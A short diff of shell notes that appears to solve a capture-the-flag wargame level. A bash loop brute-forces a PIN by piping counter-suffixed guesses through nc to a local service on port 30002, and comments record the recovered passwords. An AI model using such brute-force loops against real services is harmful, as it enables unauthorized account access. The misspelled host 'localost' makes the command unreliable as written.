@@ -1,0 +1,22 @@
+
+cd /tmp/
+touch script.sh
+
+#### 
+#!/bin/bash                                                                     
+
+counter=1
+while [ $counter -le 10000 ]
+do
+echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $counter"
+((counter++))
+done
+
+######
+
+touch password.txt
+chmod 777 script.sh
+./script.sh | nc localost 30002 > password.txt
+
+#pass
+#uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
